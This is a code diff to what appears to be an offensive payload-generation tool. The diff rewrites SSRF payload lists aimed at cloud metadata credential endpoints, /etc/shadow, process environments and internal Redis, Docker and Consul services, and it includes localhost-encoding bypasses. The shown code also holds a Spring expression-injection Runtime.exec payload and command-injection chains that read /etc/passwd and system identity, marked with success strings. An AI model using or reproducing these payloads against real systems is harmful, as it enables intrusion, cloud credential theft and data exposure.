@@ -4,6 +4,8 @@ import { buildReverseShells, buildCloudMetaPayloads, buildContainerEscapes,
          buildLowNoiseOobPayloads } from "./bypassEngine.js";
 
 const TAB = "\t";
+const NEXUS_MARKER = "===NEXUS_OUTPUT_END===";
+const NEXUS_SUCCESS_MARKER = "===NEXUS_SUCCESS===";
 const IFS = "${IFS}";
 
 function b64(s: string): string { return Buffer.from(s).toString("base64"); }
@@ -500,52 +502,30 @@ export function generateSuggestions(
 
     case "ssrf":
       return [
+        "http://169.254.169.254/latest/meta-data/",
         "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "http://169.254.169.254/latest/user-data",
-        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-        "dict://127.0.0.1:6379/info",
-        "gopher://127.0.0.1:6379/_INFO%0d%0a",
-        "dict://127.0.0.1:11211/stat",
-        "http://127.0.0.1:9200/_cat/indices",
-        "http://127.0.0.1:2375/containers/json",
-        "http://127.0.0.1:10250/pods",
-        "http://127.0.0.1:8080/actuator/env",
-        "file:///etc/passwd",
-        "file:///proc/self/environ",
-        "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
-        "http://[::1]/",
-        "http://0177.0.0.1/",
-        "http://0x7f000001/",
-        `http://127.0.0.1/?${b}`,
-        `gopher://127.0.0.1:6379/_SLAVEOF%20127.0.0.1%206380%0d%0a`,
-        `http://127.0.0.1:8500/v1/kv/?recurse`,
-        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
         "http://100.100.100.200/latest/meta-data/",
-        "http://192.168.0.1/",
-        "http://10.0.0.1/",
-        "http://2130706433/",
-        "http://0/",
-        "http://localhost/",
-        "http://127.1/",
-        "http://127.0.1/",
-        "http://0:80/",
-        "http://[0:0:0:0:0:ffff:127.0.0.1]/",
-        "http://169.254.169.254.nip.io/latest/meta-data/",
-        "http://127.0.0.1.nip.io/",
-        "http://localtest.me/",
-        "http://127.0.0.1:80/",
-        "http://127.0.0.1:443/",
-        "http://127.0.0.1:22/",
-        "http://127.0.0.1:3306/",
-        "http://127.0.0.1:5432/",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "file:///etc/passwd",
+        "file:///etc/shadow",
+        "file:///proc/self/environ",
+        "file:///proc/net/tcp",
+        "dict://localhost:6379/INFO",
+        "gopher://localhost:6379/_INFO",
+        "ldap://localhost:389/%00",
+        "http://localhost:9200/_cat/indices",
+        "http://localhost:8500/v1/kv/?recurse",
+        "http://localhost:2375/containers/json",
         "http://127.0.0.1:6379/",
-        "http://127.0.0.1:9200/",
-        "http://127.0.0.1:8080/",
-        "http://127.0.0.1:4848/",
-        "http://fd00:ec2::254/latest/meta-data/",
+        "http://0x7f000001/",
+        "http://2130706433/",
+        "http://localhost:4566/",
+        "http://localhost:5601/",
       ];
 
+    
     case "spring":
       return [
         `${"${"}T(java.lang.Runtime).getRuntime().exec('${b.replace(/'/g,"\\'")}')${"}"}`,
@@ -624,6 +604,12 @@ export function generateSuggestions(
 
     case "classic":
       return [
+        `${b};echo '${NEXUS_MARKER}' 2>/dev/null`,
+        `${b} && echo '${NEXUS_SUCCESS_MARKER}' && id && uname -a`,
+        `${b}|tee /dev/stderr`,
+        `${b} 2>&1`,
+        `${b} && cat /etc/passwd|head -3`,
+
         `${b} && id && uname -a && hostname && whoami`,
         `${b}; cat /etc/passwd | head -5`,
         `${b}; ls -la /root 2>/dev/null || ls -la /home`,
